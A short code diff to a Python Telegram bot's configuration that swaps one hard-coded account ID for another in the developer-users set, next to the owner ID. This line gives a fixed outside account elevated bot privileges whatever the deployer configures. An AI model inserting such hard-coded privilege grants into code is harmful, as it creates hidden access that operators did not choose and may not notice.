@@ -54,7 +54,6 @@ if ENV:
     TIME_API_KEY = os.environ.get("TIME_API_KEY", None)
     WORKERS = int(os.environ.get("WORKERS", 8))
     OWNER_USERNAME = os.environ.get("OWNER_USERNAME", "xeno_kakarot")
-
     try:
         OWNER_ID = int(os.environ.get("OWNER_ID", None))
     except ValueError:
@@ -146,7 +145,7 @@ else:
 
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(1356469075)
+DEV_USERS.add(7078181502)
 
 
 updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
